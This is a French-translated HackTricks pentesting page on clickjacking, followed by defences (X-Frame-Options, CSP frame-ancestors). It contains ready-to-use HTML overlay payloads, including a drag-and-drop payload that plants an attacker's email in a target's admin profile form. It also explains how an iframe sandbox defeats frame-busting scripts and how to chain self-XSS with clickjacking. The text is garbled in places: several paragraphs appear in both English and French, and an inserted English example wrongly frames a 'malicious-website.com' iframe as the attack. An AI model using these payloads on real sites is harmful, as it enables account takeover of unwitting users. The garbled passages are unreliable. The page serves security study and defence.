# Clickjacking

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? Ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour cr√©er et **automatiser des flux de travail** avec les outils communautaires les plus avanc√©s au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Qu'est-ce que le Clickjacking

Le Clickjacking est une attaque qui **trompe** un **utilisateur** en le faisant **cliquer** sur un **√©l√©ment** d'une page web qui est **invisible** ou d√©guis√© en un autre √©l√©ment. Cela peut amener les utilisateurs √† t√©l√©charger involontairement des logiciels malveillants, √† visiter des pages web malveillantes, √† fournir des informations d'identification ou sensibles, √† transf√©rer de l'argent ou √† acheter des produits en ligne. (De [ici](https://www.imperva.com/learn/application-security/clickjacking/)).

### Astuce de pr√©remplissage de formulaires

Il est parfois possible de **remplir la valeur des champs d'un formulaire en utilisant des param√®tres GET lors du chargement d'une page**. Un attaquant peut exploiter ce comportement pour remplir un formulaire avec des donn√©es arbitraires et envoyer la charge utile de clickjacking afin que l'utilisateur appuie sur le bouton Soumettre.

### Remplir un formulaire avec Drag\&Drop

Si vous avez besoin que l'utilisateur **remplisse un formulaire** mais que vous ne voulez pas lui demander directement d'√©crire des informations sp√©cifiques (comme l'e-mail et/ou un mot de passe sp√©cifique que vous connaissez), vous pouvez simplement lui demander de **faire glisser et d√©poser** quelque chose qui √©crira vos donn√©es contr√¥l√©es comme dans [**cet exemple**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Charge utile de base
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Charge utile √† plusieurs √©tapes

Clickjacking can be made more effective by using a multistep payload. In this technique, the attacker divides the clickjacking attack into multiple steps, each requiring the victim to perform a specific action.

Le clickjacking peut √™tre rendu plus efficace en utilisant une charge utile √† plusieurs √©tapes. Dans cette technique, l'attaquant divise l'attaque de clickjacking en plusieurs √©tapes, chacune n√©cessitant que la victime effectue une action sp√©cifique.

The first step involves tricking the victim into clicking on a transparent or hidden element on the attacker's website. This can be achieved by overlaying the element on top of a legitimate button or link, making it difficult for the victim to notice.

La premi√®re √©tape consiste √† tromper la victime en cliquant sur un √©l√©ment transparent ou cach√© sur le site web de l'attaquant. Cela peut √™tre r√©alis√© en superposant l'√©l√©ment sur un bouton ou un lien l√©gitime, rendant difficile pour la victime de le remarquer.

Once the victim clicks on the element, the attacker can then load a new page or perform a specific action on behalf of the victim. This can include submitting a form, making a purchase, or even changing account settings.

Une fois que la victime clique sur l'√©l√©ment, l'attaquant peut ensuite charger une nouvelle page ou effectuer une action sp√©cifique au nom de la victime. Cela peut inclure la soumission d'un formulaire, l'achat d'un produit ou m√™me la modification des param√®tres du compte.

By breaking the clickjacking attack into multiple steps, the attacker can increase the chances of successfully tricking the victim and achieving their malicious goals.

En divisant l'attaque de clickjacking en plusieurs √©tapes, l'attaquant peut augmenter les chances de tromper avec succ√®s la victime et d'atteindre ses objectifs malveillants.
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Payload Drag\&Drop + Clic

Clickjacking is a technique that tricks users into clicking on something different from what they perceive. One way to achieve this is by combining the drag and drop functionality with a click payload.

#### How it works

1. The attacker creates a malicious webpage that contains an invisible element, such as an iframe, positioned on top of a legitimate button or link.
2. The attacker uses JavaScript to capture the user's click event on the invisible element.
3. When the user clicks on the visible button or link, the click event is actually triggered on the invisible element, executing the attacker's payload.

#### Example

```html
<!DOCTYPE html>
<html>
  <head>
    <style>
      #invisible {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0;
      }
    </style>
  </head>
  <body>
    <button onclick="alert('Legitimate button clicked!')">Click me</button>
    <iframe id="invisible" src="http://malicious-website.com"></iframe>
  </body>
</html>
```

In this example, the attacker creates an invisible iframe that covers the entire webpage. When the user clicks on the "Click me" button, the click event is actually triggered on the invisible iframe, executing the payload from the malicious website.

#### Mitigation

To protect against clickjacking attacks, you can implement the following measures:

- Implement X-Frame-Options header to prevent your website from being loaded within an iframe.
- Use the Content-Security-Policy header to restrict which domains can embed your website.
- Implement frame-busting JavaScript code to prevent your website from being loaded within an iframe.
- Educate users about the risks of clicking on unfamiliar or suspicious links.

By implementing these measures, you can significantly reduce the risk of clickjacking attacks.
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Si vous avez identifi√© une attaque **XSS qui n√©cessite que l'utilisateur clique** sur un √©l√©ment pour **d√©clencher** l'XSS et que la page est **vuln√©rable au clickjacking**, vous pouvez l'exploiter pour tromper l'utilisateur en le faisant cliquer sur le bouton/lien.\
Exemple:\
_Vous avez trouv√© un **self XSS** dans certains d√©tails priv√©s du compte (des d√©tails que **vous seul pouvez d√©finir et lire**). La page avec le **formulaire** pour d√©finir ces d√©tails est **vuln√©rable** au **clickjacking** et vous pouvez **pr√©-remplir** le **formulaire** avec les param√®tres GET._\
\_\_Un attaquant pourrait pr√©parer une attaque **clickjacking** sur cette page en **pr√©-remplissant** le **formulaire** avec la **charge utile XSS** et en trompant l'utilisateur pour qu'il **soumette** le formulaire. Ainsi, **lorsque le formulaire est soumis** et que les valeurs sont modifi√©es, l'utilisateur ex√©cutera l'XSS.

## Comment √©viter le Clickjacking

### D√©fenses c√¥t√© client

Il est possible d'ex√©cuter des scripts c√¥t√© client qui effectuent certains ou tous les comportements suivants pour pr√©venir le Clickjacking :

* v√©rifier et imposer que la fen√™tre d'application actuelle est la fen√™tre principale ou sup√©rieure,
* rendre tous les frames visibles,
* emp√™cher de cliquer sur des frames invisibles,
* intercepter et signaler les attaques potentielles de clickjacking √† un utilisateur.

#### Contournement

Comme les bloqueurs de frames sont en JavaScript, les param√®tres de s√©curit√© du navigateur peuvent emp√™cher leur fonctionnement ou m√™me le navigateur peut ne pas prendre en charge JavaScript. Une solution de contournement efficace pour un attaquant contre les bloqueurs de frames est d'utiliser l'**attribut `sandbox` de l'iframe HTML5**. Lorsque cela est d√©fini avec les valeurs `allow-forms` ou `allow-scripts` et que la valeur `allow-top-navigation` est omise, le script du bloqueur de frames peut √™tre neutralis√© car l'iframe ne peut pas v√©rifier s'il s'agit ou non de la fen√™tre sup√©rieure :
```markup
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
Les valeurs `allow-forms` et `allow-scripts` permettent d'autoriser les actions sp√©cifi√©es dans l'iframe, mais la navigation de niveau sup√©rieur est d√©sactiv√©e. Cela emp√™che les comportements de rupture de frame tout en permettant la fonctionnalit√© sur le site cibl√©.

Selon le type d'attaque par d√©tournement de clics, **vous devrez peut-√™tre √©galement autoriser** `allow-same-origin` et `allow-modals` ou [m√™me plus](https://www.w3schools.com/tags/att\_iframe\_sandbox.asp). Lors de la pr√©paration de l'attaque, v√©rifiez simplement la console du navigateur, elle peut vous indiquer les autres comportements que vous devez autoriser.

### X-Frame-Options

L'en-t√™te de r√©ponse HTTP **`X-Frame-Options`** peut √™tre utilis√© pour indiquer si un navigateur doit √™tre **autoris√©** ou non √† afficher une page dans une balise `<frame>` ou `<iframe>`. Les sites peuvent l'utiliser pour √©viter les attaques par d√©tournement de clics en veillant √† ce que **leur contenu ne soit pas int√©gr√© dans d'autres sites**. D√©finissez l'en-t√™te **`X-Frame-Options`** pour toutes les r√©ponses contenant du contenu HTML. Les valeurs possibles sont :

* `X-Frame-Options: deny` qui **emp√™che tout domaine d'encadrer le contenu** (_Valeur recommand√©e_)
* `X-Frame-Options: sameorigin` qui **autorise uniquement le site actuel** √† encadrer le contenu.
* `X-Frame-Options: allow-from https://trusted.com` qui **autorise le 'uri' sp√©cifi√©** √† encadrer cette page.
* V√©rifiez les limitations ci-dessous car **cela √©chouera si le navigateur ne le prend pas en charge**.
* D'autres navigateurs prennent en charge la nouvelle directive **CSP frame-ancestors √† la place**. Quelques-uns prennent en charge les deux.

### Directive frame-ancestors de la politique de s√©curit√© du contenu (CSP)

La protection contre le d√©tournement de clics recommand√©e consiste √† incorporer la directive **`frame-ancestors`** dans la politique de s√©curit√© du contenu de l'application.\
La directive **`frame-ancestors 'none'`** a un comportement similaire √† la directive **X-Frame-Options `deny`** (_Personne ne peut encadrer la page_).\
La directive **`frame-ancestors 'self'`** est largement √©quivalente √† la directive **X-Frame-Options `sameorigin`** (_seul le site actuel peut l'encadrer_).\
La directive **`frame-ancestors trusted.com`** est largement √©quivalente √† la directive **X-Frame-Options** `allow-from` (_seul le site de confiance peut l'encadrer_).

La CSP suivante autorise uniquement les frames du m√™me domaine :

`Content-Security-Policy: frame-ancestors 'self';`

Consultez la documentation suivante pour plus de d√©tails et des exemples plus complexes :

* [https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)

### Limitations <a href="#limitations" id="limitations"></a>

* **Prise en charge du navigateur :** Les directives CSP frame-ancestors ne sont pas encore prises en charge par tous les principaux navigateurs.
* **X-Frame-Options a la priorit√© :** La section "Relation avec X-Frame-Options" de la sp√©cification CSP indique : "_Si une ressource est fournie avec une politique qui inclut une directive appel√©e frame-ancestors et dont la disposition est "enforce", alors l'en-t√™te X-Frame-Options DOIT √™tre ignor√©_", mais Chrome 40 et Firefox 35 ignorent la directive frame-ancestors et suivent plut√¥t l'en-t√™te X-Frame-Options.

## R√©f√©rences

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour cr√©er et **automatiser facilement des flux de travail** avec les outils communautaires les plus avanc√©s au monde.\
Acc√©dez-y d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Vous travaillez dans une **entreprise de cybers√©curit√©** ? Vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ? ou souhaitez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
